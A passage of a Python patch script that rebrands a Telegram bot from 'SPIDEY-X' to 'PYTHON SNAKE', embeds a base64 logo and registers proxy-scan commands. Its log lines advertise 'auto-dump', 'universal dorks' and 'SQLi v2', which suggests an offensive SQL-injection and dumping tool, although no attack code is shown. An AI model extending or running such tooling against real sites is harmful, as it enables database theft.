    "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"
)
_V22_LOGO_CACHE = {"path": ""}


def _v22_logo_path() -> str:
    """Logo file dhundo — warna embedded base64 se banao (single-file install)."""
    here = os.path.dirname(os.path.abspath(__file__))
    for c in (os.path.join(here, "assets", "python_snake_logo.png"),
              os.path.join(here, "assets", "python_snake_logo.jpg")):
        if os.path.isfile(c):
            return c
    if _V22_LOGO_CACHE["path"] and os.path.isfile(_V22_LOGO_CACHE["path"]):
        return _V22_LOGO_CACHE["path"]
    try:
        import base64 as _b64
        base = globals().get("DATA_DIR") or here
        d = os.path.join(str(base), "assets")
        os.makedirs(d, exist_ok=True)
        pth = os.path.join(d, "python_snake_logo.jpg")
        with open(pth, "wb") as fh:
            fh.write(_b64.b64decode(_V22_LOGO_B64))
        _V22_LOGO_CACHE["path"] = pth
        return pth
    except Exception:
        return ""


async def _v22_send_logo(msg, caption: str = "") -> bool:
    pth = _v22_logo_path()
    if not pth:
        return False
    try:
        with open(pth, "rb") as fh:
            await msg.reply_photo(fh, caption=caption or None, parse_mode=ParseMode.HTML)
        return True
    except Exception:
        return False


try:
    _v22_np = len(_v22_good_proxies(0))
except Exception:
    _v22_np = 0
logger.info("🐍 PYTHON SNAKE v22 loaded — brand=PYTHON SNAKE • proxies=%s • auto-dump • universal dorks • sqlite-v2",
            _v22_np)
# ═══ PYTHON SNAKE v22 END ═══
'''

CMD_ANCHOR = '    app.add_handler(CommandHandler(["domainer", "miner"], _v21_domainer_cmd), group=-1)'
CMD_ADD = CMD_ANCHOR + '''
    app.add_handler(CommandHandler(["proxyscan", "pxscan"], _v22_proxyscan_cmd), group=-1)
    app.add_handler(CommandHandler(["proxystat", "px"], _v22_proxystat_cmd), group=-1)
    app.add_handler(CommandHandler(["proxyclear", "pxclear"], _v22_proxyclear_cmd), group=-1)
    app.add_handler(CommandHandler("classic", _v22_classic_cmd), group=-1)
    app.add_handler(CommandHandler(["brand", "logo"], _v22_brand_cmd), group=-1)'''

# Text-level rebranding (UI only — identifiers untouched)
BRAND_REPLACEMENTS = [
    ("V19-SPIDEY-X", "V22-PYTHON-SNAKE"),
    ("SPIDEY-X PRO", "PYTHON SNAKE"),
    ("SPIDEY-X ENGINE", "PYTHON SNAKE ENGINE"),
    ("🕷️ SPIDEY-X ENGINE ⚡", "🐍 PYTHON SNAKE ENGINE ⚡"),
    ("SPIDEY-X engine loaded", "PYTHON SNAKE engine loaded"),
    ("SPIDEY-X chain loaded", "PYTHON SNAKE chain loaded"),
    ("SPIDEY-X /myid", "PYTHON SNAKE /myid"),
    ("SPIDEY-X hardening loaded", "PYTHON SNAKE hardening loaded"),
    ('_V19_TAG = "SPIDEY-X"', '_V19_TAG = "PYTHON-SNAKE"'),
    ("_V20_TAG = \"SPIDEY-X\"", "_V20_TAG = \"PYTHON-SNAKE\""),
    ("︎🕷️ 𝙎𝙥𝙞𝙙𝙚𝙮 𝘽𝙤𝙩 — 𝙃𝙤𝙬 𝙏𝙤 𝙐𝙨𝙚?", "🐍 𝙋𝙮𝙩𝙝𝙤𝙣 𝙎𝙣𝙖𝙠𝙚 — 𝙃𝙤𝙬 𝙏𝙤 𝙐𝙨𝙚?"),
    ("🕷️ 𝙎𝙥𝙞𝙙𝙚𝙮'𝙨 𝘽𝙖𝙘𝙠𝙚𝙣𝙙 𝙒𝙤𝙧𝙠𝙛𝙡𝙤𝙬", "🐍 𝙋𝙮𝙩𝙝𝙤𝙣 𝙎𝙣𝙖𝙠𝙚 𝙒𝙤𝙧𝙠𝙛𝙡𝙤𝙬"),
    ("🧤 𝙎𝙥𝙞𝙙𝙚𝙮 - 𝗦𝗢𝗨𝗥𝗖𝗘 𝗖𝗢𝗗𝗘", "🐍 𝙋𝙮𝙩𝙝𝙤𝙣 𝙎𝙣𝙖𝙠𝙚 - 𝗦𝗢𝗨𝗥𝗖𝗘 𝗖𝗢𝗗𝙀"),
    ("❀ 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️", "❀ 𝙋𝙮𝙩𝙝𝙤𝙣 𝙎𝙣𝙖𝙠𝙚 🐍"),
    ("𖣔 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️", "𖣔 𝙋𝙮𝙩𝙝𝙤𝙣 𝙎𝙣𝙖𝙠𝙚 🐍"),
    ("𑁍 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️", "𑁍 𝙋𝙮𝙩𝙝𝙤𝙣 𝙎𝙣𝙖𝙠𝙚 🐍"),
    ("💀 Sᴘɪᴅᴇʏ Bᴏᴛ", "🐍 Pʏᴛʜᴏɴ Sɴᴀᴋᴇ Bᴏᴛ"),
    ("🕷️ Bᴏᴛ Pᴏʟʟɪɴɢ", "🐍 Bᴏᴛ Pᴏʟʟɪɴɢ"),
    ("✅ *Sᴘɪᴅᴇʏ V18-TITAN", "✅ *Pʏᴛʜᴏɴ Sɴᴀᴋᴇ V22"),
    ("[V18-TITAN]", "[PYTHON-SNAKE]"),
    ("🕷️ <b>SPIDEY-X", "🐍 <b>PYTHON SNAKE"),
    # baaki user-visible jagah (identifiers/paths ko chhua nahi)
    ("Spidey Performance Build", "Python Snake Performance Build"),
    ("Spidey.py", "Python_Snake.py"),
    ("Spidey_bot_main_", "PythonSnake_bot_main_"),
    ("Spidey_Active_", "PythonSnake_Active_"),
    ("SPIDEY BOT V7", "PYTHON SNAKE V7"),
    ("Spidey Bot — Online & Ready!", "Python Snake — Online & Ready!"),
    ("Spidey 12-Core Anti-Stuck V6 Engine", "Python Snake 12-Core Anti-Stuck V6 Engine"),
    ("Spidey — With Youh For Youh..!", "Python Snake — With Youh For Youh..!"),
    ("SPIDEY-X init warning", "PYTHON SNAKE init warning"),
    ("SPIDEY-X", "PYTHON-SNAKE"),
]

MISC_REPLACEMENTS = [
    # every remaining spider emoji in UI strings becomes the snake
    ("🕷️", "🐍"),
]


def patch(target: str) -> None:
    if not os.path.isfile(target):
        raise SystemExit("❌ %s nahi mila" % target)
    with open(target, "r", encoding="utf-8", errors="ignore") as f:
        src = f.read()

    for need in ("_V19_TAG", "_V20_TAG", "_V21_TAG"):
        if need not in src:
            raise SystemExit("❌ %s nahi mila — pehle v19/v20/v21 patches apply karo." % need)

    # ---- idempotent cleanup ----
    src = re.sub(re.escape(MARK_START) + r".*?" + re.escape(MARK_END) + r"\n*", "", src, flags=re.S)
    src = src.replace(CMD_ADD, CMD_ANCHOR)
    # undo old brand swaps so re-running is stable
    src = src.replace("V22-PYTHON-SNAKE", "V19-SPIDEY-X")

    # ---- commands ----
    if CMD_ANCHOR not in src:
        raise SystemExit("❌ v21 command anchor nahi mila.")
    src = src.replace(CMD_ANCHOR, CMD_ADD, 1)

    # ---- rebrand text ----
    n_brand = 0
    for old, new in BRAND_REPLACEMENTS:
        if old in src:
            n_brand += src.count(old)
            src = src.replace(old, new)
    for old, new in MISC_REPLACEMENTS:
        if old in src:
            n_brand += src.count(old)
            src = src.replace(old, new)
    # undo accidental damage inside the v22 block markers
    src = src.replace("SPIDEY-X", "PYTHON-SNAKE") if False else src

    # ---- insert block ----
    m = re.search(r'^if __name__ == ["\']__main__["\']:', src, re.M)
    if not m:
        raise SystemExit("❌ __main__ block nahi mila.")
    src = src[:m.start()] + BLOCK.strip("\n") + "\n\n\n" + src[m.start():]

    backup = "%s.v22_backup_%s" % (target, datetime.now().strftime("%Y%m%d_%H%M%S"))
    shutil.copyfile(target, backup)
    with open(target, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        py_compile.compile(target, doraise=True)
    except Exception as exc:
        shutil.copyfile(backup, target)
        raise SystemExit("❌ Compile fail — rollback. %s" % exc)
    # backup rakho — user kabhi bhi v21 pe wapas ja sake

    print("=" * 78)
    print("  ✅ PYTHON SNAKE v22 APPLIED")
    print("=" * 78)
    print("  Target   : %s" % target)
    print("  Backup   : %s" % os.path.basename(backup))
    print("  Brand    : %s text swaps" % n_brand)
    print("  New      : 🐍 AUTO DUMP • 🧬 UNIVERSAL DORKS • 🧅 PROXY v2 • SQLi v2")
    print("  Commands : /proxyscan /proxystat /proxyclear /classic /brand")
    try:
        _tree = ast.parse(BLOCK)
        _n_hidden = next(len(_n.value.elts) for _n in _tree.body
                         if isinstance(_n, ast.Assign)
                         and getattr(_n.targets[0], "id", "") == "_V22_HIDDEN")
    except Exception:
        _n_hidden = 17
    print("  Cleanup  : %d redundant buttons hidden (recover with /classic)" % _n_hidden)
    print("=" * 78)


if __name__ == "__main__":
    patch(sys.argv[1] if len(sys.argv) > 1 else "bot_fixed.py")
